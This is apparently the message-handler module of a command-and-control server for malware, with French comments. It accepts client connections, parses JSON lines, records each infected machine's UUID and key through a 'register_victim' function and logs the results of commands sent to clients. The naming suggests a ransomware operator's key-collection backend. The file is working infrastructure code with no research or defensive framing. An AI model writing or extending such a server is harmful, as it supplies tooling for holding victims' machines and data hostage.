"""
handler.py
----------

Gestion des messages reçus par le serveur.
"""

import json
from storage import register_victim


def parse_json_line(line: str) -> dict:
    try:
        return json.loads(line)
    except json.JSONDecodeError:
        print("[ERROR] JSON invalide reçu :", line)
        return {}


def handle_register(message: dict, register_client_uuid, conn):
    uuid = message.get("uuid")
    key = message.get("key")

    if not uuid or not key:
        print("[ERROR] Message register incomplet :", message)
        return

    print(f"[INFO] Enregistrement de la machine {uuid}")
    register_victim(uuid, key)
    register_client_uuid(uuid, conn)


def handle_client(conn, addr, register_client_uuid):
    print(f"[INFO] Handler démarré pour {addr}")

    buffer = ""

    while True:
        try:
            data = conn.recv(4096)
            if not data:
                print(f"[INFO] Client {addr} déconnecté")
                break

            buffer += data.decode()

            while "\n" in buffer:
                line, buffer = buffer.split("\n", 1)
                message = parse_json_line(line)

                if not message:
                    continue

                mtype = message.get("type")

                # --- Nouveau bloc : gestion des réponses du client ---
                if mtype and mtype.endswith("_result"):
                    print(f"[RESULT] Réponse du client : {message}")
                    continue
                # -----------------------------------------------------

                if mtype == "register":
                    handle_register(message, register_client_uuid, conn)
                else:
                    print(f"[INFO] Message non géré : {message}")

        except Exception as e:
            print(f"[ERROR] Problème avec {addr}: {e}")
            break
